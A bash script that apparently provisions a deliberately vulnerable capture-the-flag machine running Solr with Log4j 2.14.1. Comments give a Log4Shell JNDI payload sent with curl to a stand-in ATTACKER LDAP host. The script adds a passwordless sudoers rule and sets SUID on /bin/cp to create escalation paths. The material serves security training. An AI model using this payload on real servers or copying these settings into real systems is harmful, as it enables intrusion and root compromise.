#!/bin/bash
# CVE-2021-44228: Log4Shell - Apache Solr 8.11.0 with Log4j 2.14.1
# Foothold: JNDI injection via Solr admin API logs the user-controlled param
# Exploit:
#   curl 'http://TARGET/solr/admin/cores?action=${jndi:ldap://ATTACKER:1389/a}'
#   (requires marshalsec or JNDI exploit kit running on attacker machine)
# Foothold user: solr (or root if -force used)
# Privesc: writable cron for lateral movement, SUID cp for flag access

# Create solr user if not present
id solr &>/dev/null || useradd -r -s /bin/bash -m solr

# Allow solr user to write to ckplayer home (for user flag)
echo "solr ALL=(ckplayer) NOPASSWD:/bin/bash" >> /etc/sudoers

# SUID cp for ckplayer -> root flag access path
chmod u+s /bin/cp

# Ensure Solr can write its data
mkdir -p /opt/solr/server/solr/data
chown -R root:root /opt/solr 2>/dev/null || true
chmod -R 755 /opt/solr 2>/dev/null || true

# Create a default Solr collection config
mkdir -p /opt/solr/server/solr/gettingstarted
